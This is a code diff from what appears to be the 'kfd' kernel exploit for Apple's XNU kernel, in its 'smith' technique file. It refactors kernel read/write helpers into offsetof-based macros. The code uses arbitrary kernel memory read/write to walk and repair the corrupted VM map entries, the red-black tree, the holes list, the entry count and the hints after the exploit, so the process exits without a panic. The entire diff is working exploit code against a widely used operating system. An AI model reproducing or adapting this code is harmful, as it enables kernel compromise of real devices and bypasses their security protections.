@@ -330,6 +330,9 @@ void* smith_helper_spinner_pthread(void* arg)
     return NULL;
 }
 
+#define store_for_vme(kaddr) ((kaddr) ? (((kaddr) + offsetof(struct vm_map_entry, store.entry.rbe_left))) : (kaddr))
+#define vme_for_store(kaddr) ((kaddr) ? (((kaddr) - offsetof(struct vm_map_entry, store.entry.rbe_left)) & (~1ull)) : (kaddr))
+
 /*
  * This function is only ran from a thread spawned in smith_helper_init() if the
  * boolean parameter "take_vm_map_lock" is turned on. The reason why it is
@@ -364,13 +367,13 @@ void* smith_helper_cleanup_pthread(void* arg)
          * with a right child that is not null, but not the entry we are going to leak.
          */
         u64 map_kaddr = kfd->info.kaddr.current_map;
-        u64 entry_kaddr = kget_u64(_vm_map__hdr__links__prev, map_kaddr);
+        u64 entry_kaddr = static_kget(struct _vm_map, hdr.links.prev, map_kaddr);
 
         while (true) {
-            u64 entry_prev = kget_u64(vm_map_entry__links__prev, entry_kaddr);
-            u64 entry_start = kget_u64(vm_map_entry__links__start, entry_kaddr);
-            u64 entry_end = kget_u64(vm_map_entry__links__end, entry_kaddr);
-            u64 entry_right = kget_u64(vm_map_entry__store__entry__rbe_right, entry_kaddr);
+            u64 entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
+            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
+            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);
+            u64 entry_right = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
 
             if ((entry_end < max_address) && (entry_right != 0) && (entry_start != 0)) {
                 /*
@@ -378,8 +381,7 @@ void* smith_helper_cleanup_pthread(void* arg)
                  */
                 atomic_store(&smith->cleanup_vme.kaddr, entry_kaddr);
                 atomic_store(&smith->cleanup_vme.right, entry_right);
-                u64 store_kaddr = entry_kaddr + kfd_offset(vm_map_entry__store__entry__rbe_left);
-                kset_u64(vm_map_entry__store__entry__rbe_right, store_kaddr, entry_kaddr);
+                static_kset(struct vm_map_entry, store.entry.rbe_right, store_for_vme(entry_kaddr), entry_kaddr);
                 cleanup_vme_end = entry_end;
                 break;
             }
@@ -392,8 +394,6 @@ void* smith_helper_cleanup_pthread(void* arg)
     vm_protect(mach_task_self(), cleanup_vme_end, pages(1), false, VM_PROT_ALL);
     return NULL;
 }
-
-#define vme_for_store(kaddr) ((kaddr) ? (((kaddr) - kfd_offset(vm_map_entry__store__entry__rbe_left)) & (~1ull)) : (kaddr))
 
 /*
  * This function is responsible to patch the corrupted state of our VM map. If
@@ -431,8 +431,8 @@ void smith_helper_cleanup(struct kfd* kfd)
          * make sure the state of the VM map is corrupted as expected.
          */
         u64 entry_count = 0;
-        u64 entry_kaddr = kget_u64(_vm_map__hdr__links__next, map_kaddr);
-        u64 map_entry_kaddr = map_kaddr + kfd_offset(_vm_map__hdr__links__prev);
+        u64 entry_kaddr = static_kget(struct _vm_map, hdr.links.next, map_kaddr);
+        u64 map_entry_kaddr = map_kaddr + offsetof(struct _vm_map, hdr.links.prev);
         u64 first_vme_kaddr = 0;
         u64 first_vme_parent_store = 0;
         u64 second_vme_kaddr = 0;
@@ -447,20 +447,20 @@ void smith_helper_cleanup(struct kfd* kfd)
 
         while (entry_kaddr != map_entry_kaddr) {
             entry_count++;
-            u64 entry_next = kget_u64(vm_map_entry__links__next, entry_kaddr);
-            u64 entry_start = kget_u64(vm_map_entry__links__start, entry_kaddr);
-            u64 entry_end = kget_u64(vm_map_entry__links__end, entry_kaddr);
+            u64 entry_next = static_kget(struct vm_map_entry, links.next, entry_kaddr);
+            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
+            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);
 
             if (entry_count == 1) {
                 first_vme_kaddr = entry_kaddr;
-                first_vme_parent_store = kget_u64(vm_map_entry__store__entry__rbe_parent, entry_kaddr);
-                u64 first_vme_left_store = kget_u64(vm_map_entry__store__entry__rbe_left, entry_kaddr);
-                u64 first_vme_right_store = kget_u64(vm_map_entry__store__entry__rbe_right, entry_kaddr);
+                first_vme_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
+                u64 first_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
+                u64 first_vme_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                 assert(first_vme_left_store == 0);
                 assert(first_vme_right_store == 0);
             } else if (entry_count == 2) {
                 second_vme_kaddr = entry_kaddr;
-                second_vme_left_store = kget_u64(vm_map_entry__store__entry__rbe_left, entry_kaddr);
+                second_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
             } else if (entry_end == 0) {
                 vme_end0_kaddr = entry_kaddr;
                 vme_end0_start = entry_start;
@@ -468,13 +468,13 @@ void smith_helper_cleanup(struct kfd* kfd)
             } else if (entry_start == 0) {
                 assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                 assert(entry_kaddr == vme_for_store(second_vme_left_store));
-                u64 leaked_entry_left_store = kget_u64(vm_map_entry__store__entry__rbe_left, entry_kaddr);
-                leaked_entry_right_store = kget_u64(vm_map_entry__store__entry__rbe_right, entry_kaddr);
-                leaked_entry_parent_store = kget_u64(vm_map_entry__store__entry__rbe_parent, entry_kaddr);
+                u64 leaked_entry_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
+                leaked_entry_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
+                leaked_entry_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                 assert(leaked_entry_left_store == 0);
                 assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                 assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
-                leaked_entry_prev = kget_u64(vm_map_entry__links__prev, entry_kaddr);
+                leaked_entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
                 leaked_entry_next = entry_next;
                 leaked_entry_end = entry_end;
                 assert(leaked_entry_end == smith->vme[3].address);
@@ -488,8 +488,8 @@ void smith_helper_cleanup(struct kfd* kfd)
          *
          * We leak "vme2b" from the doubly-linked list, as explained in the write-up.
          */
-        kset_u64(vm_map_entry__links__next, leaked_entry_next, leaked_entry_prev);
-        kset_u64(vm_map_entry__links__prev, leaked_entry_prev, leaked_entry_next);
+        static_kset(struct vm_map_entry, links.next, leaked_entry_next, leaked_entry_prev);
+        static_kset(struct vm_map_entry, links.prev, leaked_entry_prev, leaked_entry_next);
 
         /*
          * Patch "vme2->vme_end".
@@ -498,18 +498,18 @@ void smith_helper_cleanup(struct kfd* kfd)
          * overwrite 0. Otherwise, the first 4 lines can be omitted.
          */
         u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
-        u64 unaligned_kaddr = vme_end0_kaddr + kfd_offset(vm_map_entry__links__start) + 1;
+        u64 unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
         u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
         kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
-        kset_u64(vm_map_entry__links__end, leaked_entry_end, vme_end0_kaddr);
+        static_kset(struct vm_map_entry, links.end, leaked_entry_end, vme_end0_kaddr);
 
         /*
          * Patch the red-black tree.
          *
          * We leak "vme2b" from the red-black tree, as explained in the write-up.
          */
-        kset_u64(vm_map_entry__store__entry__rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
-        kset_u64(vm_map_entry__store__entry__rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));
+        static_kset(struct vm_map_entry, store.entry.rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
+        static_kset(struct vm_map_entry, store.entry.rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));
 
         /*
          * Patch map->hdr.nentries.
@@ -517,11 +517,10 @@ void smith_helper_cleanup(struct kfd* kfd)
          * I believe this is not strictly necessary to prevent a kernel panic
          * when the process exits, but I like to patch it just in case.
          */
-        u64 nentries_buffer = kget_u64(_vm_map__hdr__nentries, map_kaddr);
+        u64 nentries_buffer = static_kget(struct _vm_map, hdr.nentries, map_kaddr);
         i32 old_nentries = *(i32*)(&nentries_buffer);
-        print_u32(old_nentries);
         *(i32*)(&nentries_buffer) = (old_nentries - 1);
-        kset_u64(_vm_map__hdr__nentries, nentries_buffer, map_kaddr);
+        static_kset(struct _vm_map, hdr.nentries, nentries_buffer, map_kaddr);
 
         /*
          * Patch map->hint.
@@ -529,7 +528,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We set map->hint to point to vm_map_to_entry(map), which effectively
          * means there is no valid hint.
          */
-        kset_u64(_vm_map__hint, map_entry_kaddr, map_kaddr);
+        static_kset(struct _vm_map, hint, map_entry_kaddr, map_kaddr);
     } while (0);
 
     do {
@@ -540,7 +539,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * along the way to make sure the state is corrupted as expected.
          */
         u64 hole_count = 0;
-        u64 hole_kaddr = kget_u64(_vm_map__holes_list, map_kaddr);
+        u64 hole_kaddr = static_kget(struct _vm_map, f_s._holes, map_kaddr);
         u64 first_hole_kaddr = hole_kaddr;
         u64 prev_hole_end = 0;
         u64 first_leaked_hole_prev = 0;
@@ -551,17 +550,17 @@ void smith_helper_cleanup(struct kfd* kfd)
 
         while (true) {
             hole_count++;
-            u64 hole_next = kget_u64(vm_map_entry__links__next, hole_kaddr);
-            u64 hole_start = kget_u64(vm_map_entry__links__start, hole_kaddr);
-            u64 hole_end = kget_u64(vm_map_entry__links__end, hole_kaddr);
+            u64 hole_next = static_kget(struct vm_map_entry, links.next, hole_kaddr);
+            u64 hole_start = static_kget(struct vm_map_entry, links.start, hole_kaddr);
+            u64 hole_end = static_kget(struct vm_map_entry, links.end, hole_kaddr);
 
             if (hole_start == 0) {
-                first_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
+                first_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                 first_leaked_hole_next = hole_next;
                 first_leaked_hole_end = hole_end;
                 assert(prev_hole_end == smith->vme[1].address);
             } else if (hole_start == smith->vme[1].address) {
-                second_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
+                second_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                 second_leaked_hole_next = hole_next;
                 assert(hole_end == smith->vme[2].address);
             }
@@ -579,11 +578,11 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We patch the end address of the first hole and we leak the two extra
          * holes, as explained in the write-up.
          */
-        kset_u64(vm_map_entry__links__end, first_leaked_hole_end, first_leaked_hole_prev);
-        kset_u64(vm_map_entry__links__next, first_leaked_hole_next, first_leaked_hole_prev);
-        kset_u64(vm_map_entry__links__prev, first_leaked_hole_prev, first_leaked_hole_next);
-        kset_u64(vm_map_entry__links__next, second_leaked_hole_next, second_leaked_hole_prev);
-        kset_u64(vm_map_entry__links__prev, second_leaked_hole_prev, second_leaked_hole_next);
+        static_kset(struct vm_map_entry, links.end, first_leaked_hole_end, first_leaked_hole_prev);
+        static_kset(struct vm_map_entry, links.next, first_leaked_hole_next, first_leaked_hole_prev);
+        static_kset(struct vm_map_entry, links.prev, first_leaked_hole_prev, first_leaked_hole_next);
+        static_kset(struct vm_map_entry, links.next, second_leaked_hole_next, second_leaked_hole_prev);
+        static_kset(struct vm_map_entry, links.prev, second_leaked_hole_prev, second_leaked_hole_next);
 
         /*
          * Patch map->hole_hint.
@@ -591,7 +590,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We set map->hole_hint to point to the first hole, which is guaranteed
          * to not be one of the two holes that we just leaked.
          */
-        kset_u64(_vm_map__hole_hint, first_hole_kaddr, map_kaddr);
+        static_kset(struct _vm_map, vmmap_u_1.vmmap_hole_hint, first_hole_kaddr, map_kaddr);
     } while (0);
 
     if (take_vm_map_lock) {
@@ -600,7 +599,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          */
         u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
         u64 entry_right = atomic_load(&smith->cleanup_vme.right);
-        kset_u64(vm_map_entry__store__entry__rbe_right, entry_right, entry_kaddr);
+        static_kset(struct vm_map_entry, store.entry.rbe_right, entry_right, entry_kaddr);
         assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
     }
 }
